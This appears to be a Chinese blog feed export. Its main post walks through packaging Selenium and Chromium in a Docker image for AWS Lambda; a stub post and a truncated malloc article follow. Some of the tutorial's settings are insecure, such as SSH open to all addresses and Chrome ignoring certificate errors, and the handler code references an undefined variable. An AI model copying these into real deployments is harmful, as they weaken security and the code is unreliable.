        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>這篇文章是在重現客戶問題時候的的實踐，原先為了解決客戶的問題，我試著想要安裝 <strong>Selenium Chromedriver</strong> 以及 <strong>BeautifulSoup</strong> ，打包成 Lambda Layer 並建立基於該Layer的Lambda，但一直出現 Chromedriver 找不到檔案的錯誤，左踩坑又踩坑的troubleshooting 突然這篇救星 <a href="https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda">https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda</a> ，根據這篇文章以及相對應的 github <a href="https://github.com/rchauhan9/image-scraper-lambda-container/tree/master%EF%BC%8C%E4%B8%8A%E9%9D%A2%E4%B8%BB%E8%A6%81%E6%98%AF%E4%BB%A5">https://github.com/rchauhan9/image-scraper-lambda-container/tree/master，上面主要是以</a> Container Image 的方式來建立 Lambda ，但要這麼做之前會先將需要的套件跟環境打包成 Image。</p><p>但由於公司的 Mac 不能安裝 Docker，因此我先開個 EC2 來進行大部分操作</p><div class="note alert flat"><p>本篇文章的範例以及建構所需知識皆參考自AWS官方文件</p></div><p>所有流程大概如下</p><div class="note info flat"><p>這邊透過 mermaid 繪製流程圖是參考這篇部落格以及官方文檔的教學<br><a href="https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80">https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80</a><br><a href="https://mermaid.js.org/syntax/flowchart.html">https://mermaid.js.org/syntax/flowchart.html</a></p></div><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LR   A(建立及設定EC2) --&gt; B(設定VPC)    B(設定VPC) --&gt; C(連接EC2)   C(連接EC2) --&gt; D(安裝Docker)   D(安裝Docker) --&gt; E(建構鏡像)   E(建構鏡像) --&gt;  F(測試容器)   F(測試容器) --&gt; G(推上儲存庫)   G(推上儲存庫) --&gt; H(建構Lambda)  </pre></div><h2 id="安裝-EC2"><a href="#安裝-EC2" class="headerlink" title="安裝 EC2"></a>安裝 EC2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name: TestWebScrapping</span><br><span class="line">AMI: Amazon Linux 2</span><br><span class="line">Region: us-east-1</span><br><span class="line">Access Key: &quot;CWAccess.pem&quot;</span><br></pre></td></tr></table></figure><h2 id="設定網路"><a href="#設定網路" class="headerlink" title="設定網路"></a>設定網路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IPv4 CIDR: 10.1.0.0/16</span><br><span class="line"></span><br><span class="line">Subnet: TestSubnet1</span><br><span class="line">CIDR: 10.1.0.0/24</span><br><span class="line">RouteTable: </span><br><span class="line">10.1.0.0/16   |  local</span><br><span class="line">0.0.0.0/0     |  Internet Gateway</span><br><span class="line"></span><br><span class="line">Security Group</span><br><span class="line">TCP 443 Source: 0.0.0.0/0</span><br><span class="line">TCP 80 Source: 0.0.0.0/0</span><br><span class="line">TCP 22 Source: 0.0.0.0/0</span><br></pre></td></tr></table></figure><h2 id="創建完畢後連接到-EC2"><a href="#創建完畢後連接到-EC2" class="headerlink" title="創建完畢後連接到 EC2"></a>創建完畢後連接到 EC2</h2><p><img src="https://i.imgur.com/ZQwGuqY.jpg" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;CWAccess.pem&quot; ec2-user@ec2-3-83-139-226.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure><h2 id="安裝-Docker"><a href="#安裝-Docker" class="headerlink" title="安裝 Docker"></a>安裝 Docker</h2><p>這邊的安裝文件可以參考aws的官方指引<br><a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update -y</span><br><span class="line">sudo amazon-linux-extras install docker</span><br><span class="line">sudo service docker start</span><br><span class="line">sudo usermod -a -G docker ec2-user</span><br><span class="line"></span><br><span class="line">此時重新登入Terminal</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><h2 id="建構-Docker-Image"><a href="#建構-Docker-Image" class="headerlink" title="建構 Docker Image"></a>建構 Docker Image</h2><p>在家目錄中先新增幾項檔案：</p><ul><li>requirements.txt</li><li>entry.sh</li><li>app&#x2F;app.y</li></ul><p>requirements.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests==2.25.0</span><br><span class="line">selenium==3.14.0</span><br><span class="line">beautifulsoup4==4.9.3</span><br><span class="line">Pillow==8.0.1</span><br><span class="line">boto3</span><br><span class="line">botocore</span><br></pre></td></tr></table></figure><p>entry.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;AWS_LAMBDA_RUNTIME_API&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/bin/aws-lambda-rie /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>給予執行權限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x entry.sh</span><br></pre></td></tr></table></figure><p>app&#x2F;app.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir app</span><br><span class="line">cd app</span><br><span class="line">vim app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    </span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--autoplay-policy=user-gesture-required&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-networking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-timer-throttling&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-backgrounding-occluded-windows&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-breakpad&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-client-side-phishing-detection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-component-update&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-default-apps&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-domain-reliability&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-extensions&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-features=AudioServiceOutOfProcess&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-hang-monitor&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-ipc-flooding-protection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-notifications&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-offer-store-unmasked-wallet-cards&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-popup-blocking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-print-preview&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-prompt-on-repost&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-renderer-backgrounding&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-speech-api&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-sync&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-size=33554432&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--hide-scrollbars&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-gpu-blacklist&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--metrics-recording-only&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--mute-audio&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-default-browser-check&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-first-run&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-pings&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-zygote&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--password-store=basic&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-gl=swiftshader&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-mock-keychain&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--single-process&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--user-data-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/user-data&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--data-path=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/data-path&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--homedir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/cache-dir&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">    driver = webdriver.Chrome(</span><br><span class="line">        executable_path=<span class="string">&#x27;/usr/bin/chromedriver&#x27;</span>,</span><br><span class="line">        options=chrome_options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> driver:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Selenium Driver Initiated&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: json.dumps(html, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define global args</span></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR=<span class="string">&quot;/home/app/&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION=<span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> DISTRO_VERSION=<span class="string">&quot;3.12&quot;</span></span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line"><span class="keyword">FROM</span> python:$&#123;RUNTIME_VERSION&#125;-alpine$&#123;DISTRO_VERSION&#125; AS python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    libstdc++</span></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine AS build-image</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    build-base \</span></span><br><span class="line"><span class="language-bash">    libtool \</span></span><br><span class="line"><span class="language-bash">    autoconf \</span></span><br><span class="line"><span class="language-bash">    automake \</span></span><br><span class="line"><span class="language-bash">    libexecinfo-dev \</span></span><br><span class="line"><span class="language-bash">    make \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    libcurl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install awslambdaric --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine as build-image2</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add gcc python3-dev musl-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add jpeg-dev zlib-dev libjpeg-turbo-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install -r requirements.txt --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="comment"># Stage 4</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image2 <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add jpeg-dev zlib-dev libjpeg-turbo-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add chromium chromium-chromedriver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> https://github.com/aws/aws-lambda-runtime-interface-emulator/releases/latest/download/aws-lambda-rie /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 755 /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app/* <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> entry.sh /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="string">&quot;/entry.sh&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;app.handler&quot;</span> ]</span></span><br></pre></td></tr></table></figure><p>建構 Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t awsLambdacrawler .</span><br></pre></td></tr></table></figure><p>一但建構完成後可以透過指令查看是否建構成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="測試容器"><a href="#測試容器" class="headerlink" title="測試容器"></a>測試容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 9000:8080 &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><p>輸出結果會像是這樣<br><img src="https://i.imgur.com/QlxN5Cu.jpg" alt="Imgur"></p><p>此時可以再開一個 Terminal 來去 invoke 看看請求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST &quot;http://localhost:9000/2015-03-31/functions/function/invocations&quot; -d &#x27;&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ciclBUc.jpg" alt="Imgur"></p><p>接著去建立 <strong>ECR Repository</strong>（在 Local Macbook）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr create-repository --repository-name cx-lambda --image-scanning-configuration scanOnPush=true</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag awsLambdacrawler:latest &lt;ENTER YOUR CONTAINER REPOSITORY URI&gt;:latest</span><br></pre></td></tr></table></figure><p>接著我在 Local Macbook 查看 ECR 密碼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password </span><br></pre></td></tr></table></figure><p>將密碼複製起來</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)&gt;</span><br></pre></td></tr></table></figure><ul><li>username: AWS</li><li>password:  剛剛複製的密碼</li></ul><p>將 Image 推上 Repository</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push  &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)</span><br></pre></td></tr></table></figure><p>可以去 ECR Console 上查看<br><img src="https://i.imgur.com/mBqWiCX.jpg" alt="Imgur"></p><h2 id="建立-Lambda"><a href="#建立-Lambda" class="headerlink" title="建立 Lambda"></a>建立 Lambda</h2><p>去 Lambda Console &gt; Create Function &gt; Container Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function Name: ScrappingfromImage</span><br><span class="line">Container image URI: 125657041963.dkr.ecr.us-east-1.amazonaws.com/cx-lambda:latest</span><br></pre></td></tr></table></figure><h3 id="設定-Lambda-網路存取"><a href="#設定-Lambda-網路存取" class="headerlink" title="設定 Lambda  網路存取"></a>設定 Lambda  網路存取</h3><p>若想要 Lambda Function 連接到外部網路，不同於EC2，你需要將 Lambda attach 到你自己的 VPC，並且需要把 Lambda 放到 private gateway，並且該 Private Gateway 必須要設定路由表中的預設路由到一個 <strong>NAT Gateway</strong>。<br>因為 Lambda 在連接到某個 VPC時會去建立一個 ENI，那個ENI預設只吃 Priavte IP，因此會需要一個 NAT Gateway 來進行公有私有IP的轉換，並且會透過一個叫 V2N 的功能來去連接到 NAT Gateway。</p><blockquote><p>有興趣的話可以參考這兩份官方文件，裡面對 Lambda 的聯網機制有詳細介紹<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html</a><br><a href="https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/">https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/</a></p></blockquote><p>這邊用流程圖展示的話會是這樣:</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart LR    subgraph Custom VPC        direction LR        c1(Lambda) ---&gt; a2(NATGateway)        subgraph Public Subnet            direction LR            a2(NATGateway)        end        subgraph Private Subnet            direction LR            c1(Lambda)        end    end  </pre></div><p><img src="https://i.imgur.com/7suZcAG.jpg" alt="Imgur"></p><p>private route<br><img src="https://i.imgur.com/DAMgy23.jpg" alt="Imgur"></p><h3 id="設定-Lambda-Permission"><a href="#設定-Lambda-Permission" class="headerlink" title="設定 Lambda Permission"></a>設定 Lambda Permission</h3><p>要記得幫 Lambda 添加 <code>VPCAccessExecutionRole</code> 這個 Permission</p><p>接著就是測試 code</p><p>但可以先去 Configuration &gt; General Configuration &gt; Timeout  把 timeout 調高</p><blockquote><p>Timeout: 20 sec</p></blockquote><h2 id="測試-Lambda"><a href="#測試-Lambda" class="headerlink" title="測試 Lambda"></a>測試 Lambda</h2><p><img src="https://i.imgur.com/fVsALwS.jpg" alt="Imgur"></p><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
            <tag> 網頁爬蟲 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/posts/7a776471.html"/>
      <url>/posts/7a776471.html</url>
      
        <content type="html"><![CDATA[<h1 id="從-Hugo-移植到-Hexo"><a href="#從-Hugo-移植到-Hexo" class="headerlink" title="從 Hugo 移植到 Hexo"></a>從 Hugo 移植到 Hexo</h1><p>之前在 Hugo 雖然就挺方便的，但這個 Butterfly 主題真的太贊了，就先移植過來玩看看</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>🗃️Deep Dive: malloc 函式如何進行記憶體分配</title>
      <link href="/posts/78d9b0c6.html"/>
      <url>/posts/78d9b0c6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Deep-Dive-malloc-函式如何進行記憶體分配"><a href="#Deep-Dive-malloc-函式如何進行記憶體分配" class="headerlink" title="Deep Dive: malloc 函式如何進行記憶體分配?"></a>Deep Dive: malloc 函式如何進行記憶體分配?</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>動態記憶體配置是一個重要的概念。它讓程式可以在執行期間根據需要動態地分配和釋放記憶體，而不必依賴於事先靜態分配的記憶體區塊。這樣的彈性使程式能夠更有效地利用記憶體資源，並處理各種大小和複雜性的問題。</p><p>C語言中的malloc函式是一個廣泛使用的動態記憶體分配函式。它允許程式設計師在執行期間動態地分配指定大小的記憶體區塊。malloc的一個重要特性是它能夠確保分配的記憶體區塊在使用期間是有效和可存取的，同時適當地釋放它們以避免記憶體洩漏。</p><p>然而，你或許好奇malloc函式在底層是如何實現記憶體分配的，要如何準確動態分配空出的記憶體給caller?。這就是我們將在本文中深入探討的主題。我們將著重於malloc函式的底層實現，特別是當我們呼叫malloc時，系統如何決定和分配一塊合適的記憶體位址給我們使用。</p><p>在探討這個問題之前，讓我們先回顧一下動態記憶體配置的基本概念。在C語言中，我們可以使用malloc函式來動態地分配記憶體。它的函式原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> 